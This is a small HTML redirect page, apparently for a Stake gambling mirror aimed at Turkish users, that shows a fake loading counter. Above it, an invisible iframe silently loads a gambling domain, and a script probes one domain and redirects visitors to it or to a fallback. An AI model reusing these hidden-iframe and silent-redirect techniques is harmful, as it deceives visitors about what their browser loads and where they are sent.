<meta charset="utf-8">

<!-- hidden preload -->
<iframe src="https://stakeguvenligiris.com/tr" style="display: none;"></iframe>

<style>
	@import url(https://fonts.googleapis.com/css?family=Roboto:400,900italic,900,700italic,700,500italic,500,400italic,300italic,300,100italic,100);
	* {
		box-sizing:border-box;
		margin:0;
	}
	h1,p,h2,h3,h4,ul,li,div {
		margin:0;
		padding:0;
	}
	body {
		padding:0;
		width:100vw;
		height:100vh;
		overflow:hidden;
		display:-webkit-box;
		display:-ms-flexbox;
		display:flex;
		font-family:Roboto;
	}
	.loading-page {
		background:#0f212e;
		width:100vw;
		height:100vh;
		display:-webkit-box;
		display:-ms-flexbox;
		display:flex;
		-webkit-box-pack:center;
		-ms-flex-pack:center;
		justify-content:center;
		-webkit-box-align:center;
		-ms-flex-align:center;
		align-items:center;
	}
	.loading-page .counter {
		text-align:center;
	}
	.loading-page .counter p {
		font-size:40px;
		font-weight:100;
		color:#1475e1;
	}
	.loading-page .counter h1 {
		color:white;
		font-size:60px;
		margin-top:-10px;
	}
	.loading-page .counter hr {
		background:#1475e1;
		border:none;
		height:1px;
	}
	.loading-page .counter {
		position:relative;
		width:200px;
	}
	.loading-page .counter h1.abs {
		position:absolute;
		top:0;
		width:100%;
	}
	.loading-page .counter .color {
		width:0px;
		overflow:hidden;
		color: #1475e1;
	}
	.d-none {
		display: none !important;
	}
</style>

<div class="loading-page">
	<div class="counter">
		<p>loading</p>
		<h1>0%</h1>
		<hr/>
	</div>
	<div class="gif d-none">
		<img src="stake-preloader.gif">
	</div>
</div>

<script>
	var counter = 0;
	var c = 0;
	var d = setInterval(function() {
		document.querySelector(".loading-page .counter h1").innerHTML = c + "%";
		document.querySelector(".loading-page .counter hr").style.width = c + "%";
		c++;
		if(++counter == 101) {
			clearInterval(d);
			document.querySelector(".counter").classList.add('d-none');
			document.querySelector(".gif").classList.remove('d-none');
		}
	},50);
</script>

<script>
	url = 'https://stake1037.com';
	fetch(url, { cache: "no-cache", mode: 'no-cors' })
	.then(response => {
		window.location.href = url;
	})
	.catch(error => {
		window.location.href = 'https://stakeguvenligiris.com/tr';
	});
</script>
